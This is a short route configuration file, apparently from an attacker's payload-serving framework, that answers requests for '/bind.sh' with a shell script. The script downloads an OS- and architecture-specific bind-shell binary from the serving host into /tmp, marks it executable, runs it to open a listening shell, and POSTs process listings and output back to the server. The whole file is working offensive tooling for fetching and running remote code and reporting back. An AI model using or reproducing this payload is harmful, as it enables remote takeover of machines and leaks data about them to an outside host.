---
title: Bind Shell
description: Requires bind-shell in static dir
weight: 1
pattern: /bind.sh$
is_final: true
data:
  headers:
    Content-Type: text/plain
  body: |
    DEST_FILE=/tmp/bs
    killall bs
    #if [ ! -f $DEST_FILE ]; then
      OS=$(uname)
      ARCH=$(uname -m)
      curl {{.Request.Host}}/mdaas/$OS/$ARCH/bind-shell > $DEST_FILE
      chmod +x $DEST_FILE
    #fi
#    bash -c "$DEST_FILE > /tmp/bso 2>&1 &" &
    $DEST_FILE > /tmp/bso 2>&1
    r=$(ps aux | grep bs ;cat /tmp/bso; ls -lah /tmp/bs)
    disown

    echo $r
    curl "{{.Request.Host}}/l/res/" --data "$r" -X POST
---
